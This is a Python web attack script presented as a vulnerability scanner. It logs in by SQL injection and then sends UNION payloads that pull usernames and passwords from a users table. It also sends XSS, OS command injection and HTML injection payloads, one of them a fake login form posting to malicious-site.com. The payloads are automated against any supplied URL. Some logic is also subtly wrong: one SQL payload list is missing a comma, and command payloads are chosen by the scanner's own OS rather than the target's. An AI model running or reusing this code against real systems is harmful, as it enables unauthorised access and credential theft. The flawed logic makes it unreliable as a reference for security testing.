import sys
import requests
from bs4 import BeautifulSoup
import platform



def create_session():
    session = requests.Session()
    print("Creating session")
    return session


def parse_input_fields(url, session):
    """
    Parses a webpage to extract input fields from forms.
    Prints the names of the input fields and their types for debugging.
    Returns a list of forms with their input fields.
    """
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, "html.parser")
        
        forms = []
        for form_index, form in enumerate(soup.find_all("form")):
            form_details = {
                "action": form.get("action") or "",  # Default to an empty string if 'action' is missing
                "method": form.get("method", "get").lower(),
                "inputs": []
            }
            print(f"\n[DEBUG] Form {form_index + 1}:")
            print(f"  Action: {form_details['action']}")
            print(f"  Method: {form_details['method'].upper()}")
            
            for input_tag in form.find_all("input"):
                input_name = input_tag.get("name")  # Might be None if 'name' is missing
                input_type = input_tag.get("type", "text")  # Default to 'text' if 'type' is missing
                
                if input_name:  # Only include input fields with a valid 'name'
                    print(f"    - Input Field: Name = {input_name}, Type = {input_type}")
                    form_details["inputs"].append({
                        "name": input_name,
                        "type": input_type
                    })
            
            forms.append(form_details)
        
        print(f"\n[DEBUG] Found {len(forms)} form(s) on the page.")
        return forms
    except Exception as e:
        print(f"[-] Error while parsing input fields: {e}")
        return []


def login_sql_injection(base_url, session):
    results=[]

    results.append(f" ")
    results.append(f"\n Login Using SQL Injection:")

    if session == None:
        session = create_session()
    forms = parse_input_fields(base_url, session)
    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:  # Default to the base URL if action is empty
            #results.append(f"[DEBUG] Form {form_index + 1} has no action. Using base URL as form action.")
            form_action = base_url
        elif not form_action.startswith("http"):  # Handle relative URLs
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        # Construct payload for SQL Injection
        payload = {
            input_field["name"]: "admin' OR '1'='1" if input_field["type"] == "text" else "password"
            for input_field in form["inputs"] if input_field["name"]
        }

        try:
            # Send the payload using the appropriate HTTP method
            if form["method"] == "post":
                response = session.post(form_action, data=payload)
            else:
                response = session.get(form_action, params=payload)

            if "Welcome" in response.text or "Dashboard" in response.text:
                results.append("[+] SQL Injection successful!")
            else:
                results.append("[-] SQL Injection failed.")
        except Exception as e:
            results.append(f"[-] Error while testing SQL Injection: {e}")
    return results

def test_sql_injection(base_url, session):
    results = []
    results.append(" ")
    results.append("\nSQL Injection:")

    forms = parse_input_fields(base_url, session)
    for form in forms:
        form_action = base_url + form["action"]
        
        # Determine the number of columns using ORDER BY
        num_cols = 0
        for i in range(1, 10):  # Adjust range as needed
            payload = {
                input_field["name"]: f"' ORDER BY {i} --" if input_field["type"] == "text" else "test"
                for input_field in form["inputs"] if input_field["name"]
            }
            try:
                if form["method"] == "post":
                    response = session.post(form_action, data=payload)
                else:
                    response = session.get(form_action, params=payload)
                
                if "error" in response.text.lower():
                    num_cols = i - 1
                    break
            except Exception as e:
                results.append(f"[-] Error while determining column count: {e}")
                return results
        
        results.append(f"[DEBUG] Number of columns detected: {num_cols}")

        if num_cols > 0:
        
            # Define SQL Injection payloads for SQLite, dynamically adjusting column count
            sql_payloads = [
                f"' UNION SELECT {', '.join(['sqlite_version()'] + ['NULL'] * (num_cols - 1))} --",
                "' ORDER BY 2 --",
                f"' UNION SELECT {', '.join(['username', 'password'] + ['NULL'] * (num_cols - 2))} FROM users --"
                f"' UNION SELECT {', '.join(['name'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE type='table' AND name LIKE '%user%' --",
                f"' UNION SELECT {', '.join(['name'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE type='table' --",
                f"' UNION SELECT {', '.join(['sql'] + ['NULL'] * (num_cols - 1))} FROM sqlite_master WHERE name='users' --",
                "' OR X'61646d696e'='admin' --",
                "' OR 'a' || 'a' = 'aa' --"
            ]
            
            baseline_response = session.get(form_action).text  # Get baseline response for comparison
            baseline_length = len(baseline_response)  # Store length for comparison
            
            for sql_payload in sql_payloads:
                payload = {
                    input_field["name"]: sql_payload if input_field["type"] == "text" else "test"
                    for input_field in form["inputs"] if input_field["name"]
                }
                
                try:
                    if form["method"] == "post":
                        response = session.post(form_action, data=payload)
                    else:
                        response = session.get(form_action, params=payload)
                    
                    response_length = len(response.text)
                    payload_length = len(sql_payload)
                           
                    if "error" in response.text.lower() or response.status_code != 200:
                        results.append(f"[-] SQL Injection failed using: {sql_payload}")
                    else:
                        results.append(f"[+] SQL Injection successful using: {sql_payload}")
                        
                except Exception as e:
                    results.append(f"[-] Error while testing SQL Injection with {sql_payload}: {e}")
        
        else:
            results.append("[-] SQL Injection not detected. The database did not return errors or reveal column structure during testing.")
    
    return results

def test_xss(base_url, session):
    results = []

    # Define multiple XSS payloads for testing
    payloads = {
        "basic": "<script>alert('XSS')</script>",
        "img_onerror": '<img src="invalid.jpg" onerror="alert(\'XSS\')">',
        "onmouseover": '<div onmouseover="alert(\'XSS\')">Hover Me</div>',
        "href_javascript": '<a href="javascript:alert(\'XSS\')">Click Me</a>',
        "onload": '<body onload="alert(\'XSS\')">',
        "input_injection": '"><script>alert(\'XSS\')</script>',
        "svg_injection": '<svg/onload=alert(\'XSS\')>'
    }

    forms = parse_input_fields(base_url, session)
    results.append(f" ")
    results.append(f"Cross-Site Scripting (XSS):")
    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:
            #results.append(f"[DEBUG] Form {form_index + 1} has no action. Using base URL as form action.")
            form_action = base_url
        elif not form_action.startswith("http"):
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        # Test each payload in the input fields
        for payload_name, payload_value in payloads.items():
            payload = {}

            for input_field in form["inputs"]:
                field_name = input_field["name"]
                field_type = input_field["type"]

                # Assign XSS payloads to text and textarea fields, otherwise use "test"
                if field_type in ["text", "textarea"]:
                    payload[field_name] = payload_value
                else:
                    payload[field_name] = "test"

            #results.append(f"[DEBUG] Testing Payload '{payload_name}' on Form {form_index + 1}: {payload}")

            try:
                # Send the payload using the appropriate HTTP method
                if form["method"] == "post":
                    response = session.post(form_action, data=payload)
                else:
                    response = session.get(form_action, params=payload)

                #results.append(f"\n[DEBUG] XSS Response for Form {form_index + 1}, Payload '{payload_name}':")
                
                # Check if the payload is executed in the response
                if payload_value in response.text:
                    results.append(f"[+] XSS vulnerability confirmed with Payload '{payload}' in Form {form_index + 1}!")
                else:
                    results.append(f"[-] XSS payload '{payload_name}' was not executed for Form {form_index + 1}.")
            
            except Exception as e:
                results.append(f"[-] Error while testing XSS for Form {form_index + 1} with Payload '{payload_name}': {e}")

    return results

import platform

def test_command_injection(base_url, session):
    results = []
    results.append(" ")
    results.append("\nCommand Injection:")

    # Define payloads for Windows and Linux
    payloads_windows = {
        "& net user": "Administrator",
        "& ver": "Microsoft Windows",
        "& tasklist": "svchost.exe",
        "& ipconfig /all": "Windows IP Configuration",
        "& whoami && hostname": "\\",
        "& dir": "Directory"
    }

    payloads_linux = {
        "; uname -a": "Linux",
        "; ps aux": "PID",
        "; ifconfig -a": "inet",
        "; whoami && hostname": "kali",
        "; ls": ".db"
    }

    # Determine the target OS and select payloads
    if platform.system() == "Windows":
        command_payloads = payloads_windows
    else:
        command_payloads = payloads_linux

    forms = parse_input_fields(base_url, session)
    for form in forms:
        form_action = base_url + form["action"]
        
        for command, success_indicator in command_payloads.items():
            payload = {
                input_field["name"]: f"{command}" if input_field["type"] == "text" else "test"
                for input_field in form["inputs"] if input_field["name"]
            }
            
            try:
                if form["method"] == "post":
                    response = session.post(form_action, data=payload)
                else:
                    response = session.get(form_action, params=payload)
                
                if success_indicator in response.text:
                    results.append(f"[+] Command Injection successful using: {command}")
                else:
                    results.append(f"[-] Command Injection failed using: {command}")
            except Exception as e:
                results.append(f"[-] Error while testing Command Injection with {command}: {e}")
    
    return results


def test_html_injection(base_url, session):
    results = []
    results.append(" ")
    results.append("HTML Injection:")

    # List of HTML injection payloads
    payloads = [
        "<h1>hacked</h1>",
        "<b>Bold Injection</b>",
        "<img src='x' onerror='alert(\"HTML Injection\")'>",
        "<a href='http://malicious-site.com'>Click Here</a>",
        "<svg/onload=alert(\"HTML Injection\")>",
        "<iframe src='javascript:alert(\"HTML Injection\")'></iframe>",
        "<form action='https://malicious-site.com' method='POST'><input type='text' name='username'><input type='password' name='password'><input type='submit' value='Login'></form>",
    ]

    forms = parse_input_fields(base_url, session)
    for form_index, form in enumerate(forms):
        # Handle missing or empty form action
        form_action = form["action"]
        if not form_action:  # Default to the base URL if action is empty
            form_action = base_url
        elif not form_action.startswith("http"):  # Handle relative URLs
            form_action = base_url.rstrip("/") + "/" + form_action.lstrip("/")

        results.append(f"[DEBUG] Form action URL: {form_action}")

        for payload in payloads:
            injection_payload = {}
            for input_field in form["inputs"]:
                field_name = input_field["name"]
                field_type = input_field["type"]

                # Assign HTML injection payload to text and textarea fields; assign "test" to others
                if field_type in ["text", "textarea"]:
                    injection_payload[field_name] = payload
                else:
                    injection_payload[field_name] = "test"

            #results.append(f"[DEBUG] Testing payload: {payload}")

            try:
                # Send the payload using the appropriate HTTP method
                if form["method"].lower() == "post":
                    response = session.post(form_action, data=injection_payload)
                else:
                    response = session.get(form_action, params=injection_payload)

                if payload in response.text:
                    results.append(f"[+] HTML Injection vulnerability confirmed in Form {form_index + 1} with payload: {payload}")
                else:
                    results.append(f"[-] Payload did not execute for Form {form_index + 1}: {payload}")
            except Exception as e:
                results.append(f"[-] Error while testing HTML Injection for Form {form_index + 1}: {e}")
    
    return results


def xss_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        results.extend(test_xss(target_url,session))
    return results


def command_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        results.extend(test_command_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")

    return results

def html_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        results.extend(test_html_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")
    return results

def sql_only(target_url):
    results = []
    session = create_session()

    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    results.append(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f"[+] Login successful! Proceeding to the target page...")

        # Use the main Command Injection function to test dynamically
        results.extend(test_sql_injection(target_url, session))
    else:
        results.append("[-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")
    return results

def complete_scan(target_url):
    results = []

    results.append(f"=== Vulnerability Scanner ===")
    # Create a session to handle cookies
    session = create_session()
    # Step 1: Perform SQL Injection on the login page
    login_url = "/".join(target_url.split("/")[:3])  # Extract base URL (e.g., http://127.0.0.1:5000)
    print(f"[+] Attempting SQL Injection on login page: {login_url}...")
    sql_results = login_sql_injection(login_url, session)

    if any("[+]" in result for result in sql_results):  # Continue only if any SQL Injection result was successful
        results.extend(sql_results)
        results.append(f" [+] Login successful! Proceeding to the target page...")

        #Run SQL injection
        results.extend(test_sql_injection(target_url, session))
        # Run XSS Test
        results.extend(test_xss(target_url, session))
        # Run Command Injection Test
        results.extend(test_command_injection(target_url, session))
        # Run HTML Injection Test
        results.extend(test_html_injection(target_url, session))
        
    else:
        results.append(" [-] SQL Injection failed. Skipping XSS, Command Injection, and HTML Injection tests.")


    return results

